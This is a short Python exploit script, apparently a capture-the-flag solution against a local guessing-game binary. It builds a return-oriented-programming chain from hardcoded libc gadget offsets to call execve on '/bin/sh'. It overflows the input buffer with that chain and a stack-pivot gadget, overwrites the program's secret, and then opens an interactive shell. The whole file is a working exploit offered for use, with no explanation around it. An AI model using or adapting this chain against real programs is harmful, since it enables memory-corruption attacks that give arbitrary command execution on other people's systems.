import interact
import struct

def p64(n):
    return struct.pack('Q', n)

p = interact.Process()

libc_addr = 0x7f000042c000
stack_addr = 0x7fffffffed54
bin_sh = 0x7f00005b8d57

gadgets = [
    libc_addr + 0x33544, 0x3b,
    libc_addr + 0xe8c0e,
    libc_addr + 0x21102, bin_sh,
    libc_addr + 0xbc375,
]

# Generate payload from gadgets
payload = 'a' + '\x00' + 'a'*18
for gadget in gadgets:
    payload += p64(gadget)

# Pivot gadget
pivot = p64(libc_addr + 0x3838) + p64(stack_addr) + 'a'*10

# Inject payload disguised as single char, overwrite secret
data = p.readuntil('full guess:')
p.sendline(payload + 'a'*(72 - len(payload)) + pivot)

# Enter guess that matches new secret
data = p.readuntil('full guess:')
p.sendline(pivot[8:])

p.interactive()